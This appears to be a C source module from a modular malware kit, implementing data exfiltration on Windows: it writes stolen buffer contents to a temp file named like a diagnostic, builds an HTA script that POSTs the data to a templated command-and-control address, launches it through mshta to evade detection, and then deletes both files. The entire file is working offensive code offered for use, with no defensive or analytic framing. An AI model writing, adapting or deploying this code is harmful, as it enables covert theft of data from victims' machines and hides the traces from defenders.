// chunk: exfil/mshta_lolbin
// depends: core/emit_buffer, core/run_cmd
// provides: exfiltrate, flush_to_c2
// note: LOLBin exfil via mshta + javascript XHR — stealthy HTTP POST

#ifndef CHUNK_MSHTA_LOLBIN
#define CHUNK_MSHTA_LOLBIN

#define C2_ADDR "{{C2_IP}}"
#define C2_PORT {{C2_PORT}}

static BOOL exfiltrate(const char *ip, int port, const char *data, DWORD len) {
    if (!data || len == 0) return FALSE;
    char temp_dir[MAX_PATH], temp_file[MAX_PATH], hta_file[MAX_PATH];
    GetTempPathA(MAX_PATH, temp_dir);
    snprintf(temp_file, MAX_PATH, "%s~diag_%lx.tmp", temp_dir, GetTickCount());
    snprintf(hta_file, MAX_PATH, "%s~diag_%lx.hta", temp_dir, GetTickCount() + 1);

    HANDLE hf = CreateFileA(temp_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                            FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (hf == INVALID_HANDLE_VALUE) return FALSE;
    DWORD written;
    WriteFile(hf, data, len, &written, NULL);
    CloseHandle(hf);
    if (written != len) { DeleteFileA(temp_file); return FALSE; }

    char hta_content[4096];
    snprintf(hta_content, sizeof(hta_content),
        "<html><head><script language=\"javascript\">\n"
        "var fso=new ActiveXObject('Scripting.FileSystemObject');\n"
        "var f=fso.OpenTextFile('%s',1);\n"
        "var d=f.ReadAll();f.Close();\n"
        "var x=new ActiveXObject('MSXML2.XMLHTTP');\n"
        "x.open('POST','http://%s:%d/',false);\n"
        "x.send(d);\n"
        "fso.DeleteFile('%s');\n"
        "fso.DeleteFile('%s');\n"
        "window.close();\n"
        "</script></head></html>",
        temp_file, ip, port, temp_file, hta_file);

    HANDLE hh = CreateFileA(hta_file, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                            FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_TEMPORARY, NULL);
    if (hh == INVALID_HANDLE_VALUE) { DeleteFileA(temp_file); return FALSE; }
    DWORD hta_len = (DWORD)strlen(hta_content);
    WriteFile(hh, hta_content, hta_len, &written, NULL);
    CloseHandle(hh);

    char cmd[1024], out[256] = {0};
    DWORD out_len = 0;
    snprintf(cmd, sizeof(cmd), "cmd /c mshta \"%s\"", hta_file);
    run_cmd(cmd, out, sizeof(out), &out_len);

    Sleep(2000);
    DeleteFileA(temp_file);
    DeleteFileA(hta_file);
    return TRUE;
}

static void flush_to_c2(void) {
    if (g_pos > 0) {
        exfiltrate(C2_ADDR, C2_PORT, g_data, g_pos);
        g_pos = 0;
    }
}

#endif
